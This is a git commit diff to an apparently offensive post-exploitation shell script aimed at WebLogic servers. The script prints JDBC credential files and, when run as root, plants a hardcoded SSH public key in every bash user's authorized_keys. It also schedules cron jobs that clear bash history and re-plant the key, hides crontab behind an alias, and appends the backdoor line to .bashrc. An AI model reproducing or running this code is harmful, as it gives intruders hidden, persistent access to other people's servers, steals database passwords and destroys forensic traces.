6c1459ea566719bf968e56f65ed6494257eb5637
hktalent <3135773@qq.com>
2018-11-29 09:33:03 +0800

    add weblogic

--- payload/oneKeyGetSshWeblogicJdbcPswd.sh
+++ payload/oneKeyGetSshWeblogicJdbcPswd.sh
@@ -146,17 +146,20 @@ rm -rf ./xxx.py
 echo "all jdbc.properties:"
 find ${sdomain} -type f -name "*jdbc*.properties"|xargs -I {} cat {} |grep -Ev "^#|^\s*$"
 
+set +e
+xKeys="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001"
 if [ `whoami` = "root" ];
 then
-  cat /etc/passwd|grep '/bash'|cut -d: -f6|xargs -I {} bash -c 'mkdir {}/.ssh 2>/dev/null;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001">{}/.ssh/authorized_keys;chmod 600 {}/.ssh/authorized_keys'
+  szTmp1='mkdir {}/.ssh 2>/dev/null;echo "'${xKeys}'">{}/.ssh/authorized_keys;chmod 600 {}/.ssh/authorized_keys'
+  cat /etc/passwd|grep '/bash'|cut -d: -f6|xargs -I {} bash -c "${szTmp1}"
   echo "00 20 * * * cat /dev/null > ~/.bash_history" >/tmp/myX.sh
-  echo '00 20 * * * mkdir ~/.ssh 2>/dev/null;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001">~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys' >>/tmp/myX.sh
-  
-  /usr/bin/crontab -l >>/tmp/myX.sh
+  echo '00 20 * * * mkdir ~/.ssh 2>/dev/null;echo "'${xKeys}'">~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys' >>/tmp/myX.sh
+  crontab -l >>/tmp/myX.sh
+  `cat /tmp/myX.sh|sort -u | crontab -`
   `cat /tmp/myX.sh|sort -u | /usr/bin/crontab -`
   echo 'alias crontab=""'>>~/.bashrc
   alias crontab=""
 fi
-
+echo 'mkdir ~/.ssh 2>/dev/null;echo "'${xKeys}'">~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys' >>~/.bashrc
 rm -rf /tmp/myX.sh
 rm -rf ${tmpFl}
